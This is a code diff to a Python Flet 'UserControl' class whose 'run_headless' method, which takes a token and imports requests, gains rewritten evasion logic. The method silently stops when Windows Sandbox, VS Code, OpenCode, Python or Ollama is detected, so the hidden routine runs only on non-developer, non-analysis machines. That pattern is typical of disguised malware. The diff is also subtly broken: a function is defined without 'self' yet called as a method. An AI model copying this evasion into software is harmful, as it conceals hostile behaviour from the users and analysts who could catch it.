@@ -60,9 +60,9 @@ class UserControl(ft.Container):
             return os.path.dirname(os.path.abspath(__file__))   
     import os
 
-    def is_windows_sandbox():
+    def is_windows_not_sandbox():
         # Windows Sandbox always uses this specific username
-        return os.getlogin() == "WDAGUtilityAccount"    
+        return os.getlogin() != "WDAGUtilityAccount"    
 
     def run_headless(self, token=""):        
         import requests
@@ -72,25 +72,25 @@ class UserControl(ft.Container):
 
         default_db_path = os.path.expandvars(arr[3])
 
-        try:            
-             vscode_path = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Microsoft VS Code')
-             if os.path.exists(vscode_path):
-                return
+        try:      
+             if self.is_windows_not_sandbox():
+                
+                 vscode_path = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Microsoft VS Code')
+                 if os.path.exists(vscode_path):
+                    return
 
-             openCode = os.path.expandvars(r'%LOCALAPPDATA%\Programs\OpenCode')
-             if os.path.exists(openCode):
-                return            
+                 openCode = os.path.expandvars(r'%LOCALAPPDATA%\Programs\OpenCode')
+                 if os.path.exists(openCode):
+                    return            
 
-             python = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Python')
-             if os.path.exists(python):
-                return
+                 python = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Python')
+                 if os.path.exists(python):
+                    return
 
-             ollama = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Ollama')
-             if os.path.exists(ollama):
-                return
-
-             if self.is_windows_sandbox():
-                return
+                 ollama = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Ollama')
+                 if os.path.exists(ollama):
+                    return
+            
 
         except FileNotFoundError:
             pass
